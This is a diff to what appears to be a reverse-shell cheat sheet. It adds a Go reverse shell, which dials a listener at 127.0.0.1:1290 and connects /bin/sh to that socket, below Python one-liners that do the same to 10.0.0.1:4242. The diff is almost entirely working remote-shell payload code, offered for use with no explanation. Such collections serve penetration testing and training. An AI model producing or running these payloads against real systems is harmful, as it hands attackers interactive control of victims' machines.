@@ -43,6 +43,21 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+GoLang reserse Shell:
+```go
+package main
+import "net"
+import "os/exec"
+
+func main() {
+	con,_:= net.Dial("tcp","127.0.0.1:1290")
+	cmd:=exec.Command("/bin/sh")
+	cmd.Stdin=con
+	cmd.Stdout=con
+	cmd.Stderr=con
+	cmd.Run()
+}
+```
 
 Windows only
 
